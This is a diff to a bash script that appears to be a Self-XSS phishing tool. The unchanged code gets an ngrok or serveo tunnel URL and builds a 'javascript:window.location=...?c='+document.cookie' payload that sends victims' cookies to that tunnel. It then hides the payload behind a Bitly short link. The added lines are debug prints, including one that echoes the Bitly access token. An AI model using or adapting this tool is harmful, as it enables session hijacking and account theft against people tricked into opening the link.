@@ -239,13 +239,28 @@ sed 's+redirect_link+'$website_link'+g' get.php > index.php
 
 bitlink() {
 
+
+printf "Get $ngrok == true  \n " $ngrok
+
 if [[ $ngrok == true ]]; then
-get_link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+
+	printf "Get IF ngrok TRUE:  \n "
+
+	get_link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+	echo $get_link
+
 else
-get_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
+	printf "Get ELSE ngrok FALSE:  \n "
+
+	get_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
 fi
 
+printf "Get Link \n " $get_link
+
 token=$(curl -s -u "$email:$password" -X POST "https://api-ssl.bitly.com/oauth/access_token")
+
+
+printf "Get token \n " $token
 
 
 guid=$(curl -s -X GET "https://api-ssl.bitly.com/v4/groups" -H "Authorization: Bearer $token" | grep -o '"guid":"[0-9A-Za-z]*\"' | cut -d ':' -f2 | tr -d '"')
@@ -253,7 +268,6 @@ guid=$(curl -s -X GET "https://api-ssl.bitly.com/v4/groups" -H "Authorization: B
 long_url="$website_link/javascript:window.location='$get_link/?c='+document.cookie"
 
 bitly_link=$(curl -s -X POST "https://api-ssl.bitly.com/v4/bitlinks" -H "Authorization: Bearer $token" -H "Content-Type: application/json" -d "{\"group_guid\":\"$guid\", \"long_url\": \"$long_url\" }" | grep -o '"link":"http://bit.ly/[0-9a-zA-Z]*\"' | cut -d '"' -f4)
-
 
 printf "\e[1;92m[\e[0m*\e[1;92m] Usage:\e[0m\n"
 printf "   \e[91m Self-XSS operates by tricking users into running malicious content into their browsers\n"
